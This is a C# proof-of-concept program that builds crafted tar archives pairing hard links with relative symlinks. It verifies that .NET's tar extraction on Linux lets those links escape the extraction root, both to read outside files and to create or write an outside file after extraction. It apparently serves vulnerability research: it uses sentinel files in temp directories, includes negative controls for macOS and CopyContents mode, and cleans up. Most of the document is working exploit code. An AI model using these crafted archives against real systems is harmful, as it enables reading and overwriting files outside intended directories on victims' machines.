using System;
using System.Formats.Tar;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    static void Require(bool cond, string msg)
    {
        if (!cond) throw new Exception("ASSERTION_FAILED: " + msg);
    }

    static string CreateControlTar(string root)
    {
        string tar = Path.Combine(root, "control.tar");
        using FileStream fs = File.Create(tar);
        using TarWriter writer = new TarWriter(fs, leaveOpen:false);
        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "escape")
        {
            LinkName = "../outside"
        });
        return tar;
    }

    static string CreateVariantTar(string root)
    {
        string tar = Path.Combine(root, "variant.tar");
        using FileStream fs = File.Create(tar);
        using TarWriter writer = new TarWriter(fs, leaveOpen:false);

        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "a/"));

        byte[] safeBytes = Encoding.UTF8.GetBytes("SAFE_INSIDE");
        writer.WriteEntry(new PaxTarEntry(TarEntryType.RegularFile, "inside")
        {
            DataStream = new MemoryStream(safeBytes, writable:false)
        });

        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "a/s")
        {
            LinkName = "../inside"
        });

        writer.WriteEntry(new PaxTarEntry(TarEntryType.HardLink, "escape")
        {
            LinkName = "a/s"
        });

        return tar;
    }


    static string CreateDeepVariantTar(string root)
    {
        string tar = Path.Combine(root, "deep-variant.tar");
        using FileStream fs = File.Create(tar);
        using TarWriter writer = new TarWriter(fs, leaveOpen:false);

        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "d1/"));
        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "d1/d2/"));
        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "d1/d2/d3/"));
        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "d1/d2/d3/d4/"));
        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "d1/d2/d3/outside2/"));

        byte[] safeBytes = Encoding.UTF8.GetBytes("DEEP_SAFE_INSIDE");
        writer.WriteEntry(new PaxTarEntry(TarEntryType.RegularFile, "d1/d2/d3/outside2/secret")
        {
            DataStream = new MemoryStream(safeBytes, writable:false)
        });

        // Safe at d1/d2/d3/d4/s:
        //   ../../../outside2/secret -> d1/outside2/secret? Need 1 level less.
        // Use ../outside2/secret from d4: d1/d2/d3/outside2/secret (inside).
        // Rebased at dest/escape2: ../outside2/secret -> sibling outside destination root.
        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "d1/d2/d3/d4/s")
        {
            LinkName = "../outside2/secret"
        });

        writer.WriteEntry(new PaxTarEntry(TarEntryType.HardLink, "escape2")
        {
            LinkName = "d1/d2/d3/d4/s"
        });

        return tar;
    }


    static string CreateDanglingWriteVariantTar(string root)
    {
        string tar = Path.Combine(root, "dangling-write.tar");
        using FileStream fs = File.Create(tar);
        using TarWriter writer = new TarWriter(fs, leaveOpen:false);

        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "x/"));
        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "x/y/"));

        // At x/y/s, ../future-created.txt resolves to x/future-created.txt inside the extraction root.
        // At rebased root-level escape-write, the same target resolves one level outside the root.
        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "x/y/s")
        {
            LinkName = "../future-created.txt"
        });

        writer.WriteEntry(new PaxTarEntry(TarEntryType.HardLink, "escape-write")
        {
            LinkName = "x/y/s"
        });

        return tar;
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        if (OperatingSystem.IsWindows())
        {
            Console.WriteLine("SKIP_WINDOWS_POSIX_HARDLINK_SYMLINK_SEMANTICS");
            return;
        }

        string root = Path.Combine(Path.GetTempPath(), "tar-hardlink-variant-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);

        try
        {
            string outside = Path.Combine(root, "inside");
            File.WriteAllText(outside, "OUTSIDE_SENTINEL_61af");

            string controlDest = Path.Combine(root, "control-dest");
            Directory.CreateDirectory(controlDest);
            string controlTar = CreateControlTar(root);

            bool controlRejected = false;
            try
            {
                TarFile.ExtractToDirectory(controlTar, controlDest, overwriteFiles:true);
            }
            catch(IOException)
            {
                controlRejected = true;
            }

            Console.WriteLine($"DIRECT_OUTSIDE_SYMLINK_REJECTED={controlRejected}");
            Require(controlRejected, "patched runtime must reject direct outside-pointing symlink");
            Require(!File.Exists(Path.Combine(controlDest, "escape")) &&
                    !Directory.Exists(Path.Combine(controlDest, "escape")),
                    "direct rejected escape link must not exist");

            string variantDest = Path.Combine(root, "variant-dest");
            Directory.CreateDirectory(variantDest);
            string variantTar = CreateVariantTar(root);

            var defaultOptions = new TarExtractOptions { OverwriteFiles = true };
            Console.WriteLine($"DEFAULT_HARDLINK_MODE={defaultOptions.HardLinkMode}");
            Require(defaultOptions.HardLinkMode == TarHardLinkMode.PreserveLink,
                "default Tar hard-link extraction mode must be PreserveLink");

            TarFile.ExtractToDirectory(variantTar, variantDest, defaultOptions);

            string sourceLink = Path.Combine(variantDest, "a", "s");
            string escapedLink = Path.Combine(variantDest, "escape");
            string safeInside = Path.Combine(variantDest, "inside");

            var sourceInfo = new FileInfo(sourceLink);
            var escapedInfo = new FileInfo(escapedLink);

            Console.WriteLine($"SOURCE_LINK_TARGET={sourceInfo.LinkTarget}");
            Console.WriteLine($"ESCAPE_LINK_TARGET={escapedInfo.LinkTarget}");
            Console.WriteLine($"SOURCE_READ={File.ReadAllText(sourceLink)}");
            Console.WriteLine($"ESCAPE_READ={File.ReadAllText(escapedLink)}");

            string sourceResolved = sourceInfo.ResolveLinkTarget(returnFinalTarget:true)?.FullName ?? "<null>";
            string escapeResolved = escapedInfo.ResolveLinkTarget(returnFinalTarget:true)?.FullName ?? "<null>";
            Console.WriteLine($"SOURCE_RESOLVED={sourceResolved}");
            Console.WriteLine($"ESCAPE_RESOLVED={escapeResolved}");
            Console.WriteLine($"DEST_ROOT={variantDest}");

            Require(File.ReadAllText(sourceLink) == "SAFE_INSIDE",
                "original deep symlink must remain safely contained");

            if (OperatingSystem.IsMacOS())
            {
                Require(escapedInfo.LinkTarget is null,
                    "macOS negative control should hard-link the resolved file, not preserve the symlink inode");
                Require(File.ReadAllText(escapedLink) == "SAFE_INSIDE",
                    "macOS negative control must remain contained");
                Console.WriteLine("MACOS_HARDLINK_SYMLINK_DEREFERENCE_CONTROL=PASS");
                return;
            }

            Require(File.ReadAllText(escapedLink) == "OUTSIDE_SENTINEL_61af",
                "hard-linked symlink at shallower path must resolve to outside sentinel");

            string destPrefix = Path.GetFullPath(variantDest) + Path.DirectorySeparatorChar;
            Require(!Path.GetFullPath(escapeResolved).StartsWith(destPrefix, StringComparison.Ordinal),
                "hard-linked symlink final target must be outside extraction root");

            Console.WriteLine("TAR_HARDLINK_REBASED_SYMLINK_ESCAPE=CONFIRMED");

            string outside2Dir = Path.Combine(root, "outside2");
            Directory.CreateDirectory(outside2Dir);
            File.WriteAllText(Path.Combine(outside2Dir, "secret"), "OUTSIDE2_SENTINEL_d917");

            string deepDest = Path.Combine(root, "deep-dest");
            Directory.CreateDirectory(deepDest);
            string deepTar = CreateDeepVariantTar(root);
            TarFile.ExtractToDirectory(deepTar, deepDest, overwriteFiles:true);

            string deepSafe = Path.Combine(deepDest, "d1", "d2", "d3", "d4", "s");
            string deepEscape = Path.Combine(deepDest, "escape2");

            Console.WriteLine($"DEEP_SOURCE_TARGET={new FileInfo(deepSafe).LinkTarget}");
            Console.WriteLine($"DEEP_ESCAPE_TARGET={new FileInfo(deepEscape).LinkTarget}");
            Console.WriteLine($"DEEP_SOURCE_READ={File.ReadAllText(deepSafe)}");
            Console.WriteLine($"DEEP_ESCAPE_READ={File.ReadAllText(deepEscape)}");

            Require(File.ReadAllText(deepSafe) == "DEEP_SAFE_INSIDE",
                "deep source symlink must resolve to contained file before hardlink rebase");
            Require(File.ReadAllText(deepEscape) == "OUTSIDE2_SENTINEL_d917",
                "rebased deep symlink must access second researcher-controlled outside path");

            Console.WriteLine("TAR_HARDLINK_REBASE_GENERALITY=CONFIRMED");

            string copyDest = Path.Combine(root, "copycontents-dest");
            Directory.CreateDirectory(copyDest);
            TarFile.ExtractToDirectory(
                variantTar,
                copyDest,
                new TarExtractOptions
                {
                    OverwriteFiles = true,
                    HardLinkMode = TarHardLinkMode.CopyContents
                });

            string copiedEscape = Path.Combine(copyDest, "escape");
            FileInfo copiedEscapeInfo = new(copiedEscape);
            Require(copiedEscapeInfo.LinkTarget is null,
                "CopyContents control should materialize a normal file rather than preserve a rebased symlink");
            Require(File.ReadAllText(copiedEscape) == "SAFE_INSIDE",
                "CopyContents control should remain inside extraction root");
            Console.WriteLine("TAR_HARDLINK_COPYCONTENTS_NEGATIVE_CONTROL=PASS");

            string asyncDest = Path.Combine(root, "async-dest");
            Directory.CreateDirectory(asyncDest);
            await TarFile.ExtractToDirectoryAsync(variantTar, asyncDest, overwriteFiles:true);

            string asyncEscape = Path.Combine(asyncDest, "escape");
            Require(new FileInfo(asyncEscape).LinkTarget == "../inside",
                "async extraction must preserve rebased symlink inode on Linux");
            Require(File.ReadAllText(asyncEscape) == "OUTSIDE_SENTINEL_61af",
                "async extraction rebased link must resolve outside root");
            Console.WriteLine("TAR_HARDLINK_REBASED_SYMLINK_ESCAPE_ASYNC=CONFIRMED");

            string writeDest = Path.Combine(root, "write-dest");
            Directory.CreateDirectory(writeDest);
            string writeTar = CreateDanglingWriteVariantTar(root);
            TarFile.ExtractToDirectory(writeTar, writeDest, overwriteFiles:true);

            string writeEscape = Path.Combine(writeDest, "escape-write");
            string outsideCreated = Path.Combine(root, "future-created.txt");

            Require(new FileInfo(writeEscape).LinkTarget == "../future-created.txt",
                "rebased write symlink must retain attacker-controlled relative target");
            Require(!File.Exists(outsideCreated),
                "outside target must not exist before the post-extraction write");

            File.WriteAllText(writeEscape, "POST_EXTRACTION_OUTSIDE_WRITE_5ea2");

            Require(File.Exists(outsideCreated),
                "ordinary write through extracted path must create file outside destination root");
            Require(File.ReadAllText(outsideCreated) == "POST_EXTRACTION_OUTSIDE_WRITE_5ea2",
                "outside file must contain controlled write marker");

            Console.WriteLine($"POST_EXTRACTION_WRITE_PATH={outsideCreated}");
            Console.WriteLine("TAR_REBASED_SYMLINK_OUTSIDE_WRITE_PRIMITIVE=CONFIRMED");
        }
        finally
        {
            try { Directory.Delete(root, recursive:true); } catch {}
        }
    }
}
